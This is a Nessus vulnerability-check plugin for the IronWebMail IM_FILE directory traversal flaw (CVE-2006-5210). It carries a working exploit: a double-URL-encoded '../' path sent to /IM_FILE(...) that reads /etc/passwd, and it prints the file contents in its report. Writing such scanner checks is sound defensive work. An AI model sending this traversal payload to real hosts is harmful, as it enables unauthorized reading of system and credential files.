#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(22901);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2006-5210");
  script_bugtraq_id(20436);
  script_xref(name:"OSVDB", value:"29755");

  script_name(english:"IronMail IronWebMail IM_FILE Identifier Encoded Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file via IronWebMail");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a directory traversal vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be an IronMail appliance, which is intended
to protect enterprise-class email servers from spam, viruses, and
hackers. 

The webmail component of the remote IronMail device does not properly
validate pathname references included in a URL before using them to
return the contents of files on the remote host.  An unauthenticated
attacker can leverage this flaw to read arbitrary files and
directories on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/advisories/11308" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Ironmail version 6.1.1 as necessary and install HotFix-17,
as described in the vendor advisory referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80);

# Grab the initial page.
res = http_get_cache(item:"/", port:port);
if (res == NULL) exit(0);


# If it looks like IronWebMail...
if ("<title>IronMail IronWebMail Portal Login</title>" >< res)
{
  # Try to exploit the flaw to read a local file.
  file = "../../../../../../../../../../../../etc/passwd";
  exploit = urlencode(
    str        : file,
    unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/"
  );
  exploit = urlencode(
    str        : exploit,
    unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/"
  );
  r = http_send_recv3(method:"GET", port:port, item:string("/IM_FILE(", exploit, ")"));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    if (report_verbosity)
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = NULL;

    security_warning(port:port, extra:report);
    exit(0);
  }
}

